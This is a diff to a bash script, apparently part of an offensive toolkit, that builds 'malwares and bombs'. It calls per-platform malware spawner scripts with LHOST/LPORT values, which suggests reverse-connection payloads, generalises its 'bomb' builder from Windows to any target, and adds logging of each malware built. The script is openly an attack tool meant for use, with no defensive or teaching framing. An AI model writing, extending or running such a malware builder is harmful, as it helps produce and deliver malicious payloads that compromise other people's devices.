@@ -1,6 +1,7 @@
 source $PODGL/lib/fsh.cfg.sh
 
 cout "Starting Digle Builder..."
+clog "Started The Digle MaB (Malwares and Bombs) Builder"
 sleep 0.4
 
 if [ "$WHAT" == '' ];then
@@ -9,7 +10,7 @@ if [ "$WHAT" == '' ];then
 fi
 
 bomb(){
-   cout "Preparing To Build a Windows Bomb ($1)"
+   cout "Preparing To Build a Bomb ($1)"
    sleep 1
    cout "Copying Bytes to $1"
    sleep 1.5
@@ -18,11 +19,12 @@ bomb(){
      cerr "One Or More Option Are not valid, execute show options and set all required values for building bombs"
      exit 1
    fi
-   cout "Windows Bomb $1 Created Successfully"
+   cout "Bomb $1 Created Successfully"
    sleep 1
    cout "Checking Integrity of Bomb $1..."
    sleep 0.5
-   cout "Done... $1 is now ready to Bomb Windows"
+   cout "Done... $1 is now ready to Bomb Your Target"
+   clog "Builded A Bomb Targetting A $TARGET In a $SYSTEM Device"
 }
 
 malware(){
@@ -32,11 +34,12 @@ malware(){
    fi
    cout "Building $1..."
    sleep 1
-   bash $PODGL/sys/malware/$MALWARE/$PLATFORM/$ACTION/spawner.sh $VICTIM $PORT $1 &> /dev/null
+   bash $PODGL/sys/malware/$MALWARE/$PLATFORM/$ACTION/spawner.sh $LHOST $LPORT $1 &> /dev/null
    if [ ! -f "$1" ]; then
        cerr "An Error Was Occured While Building $1, use show options or show values and set all required values"
        exit 1
    fi
+   clog "Builded A $MALWARE Malware With Type $ACTION"
 }
 
 $WHAT $1
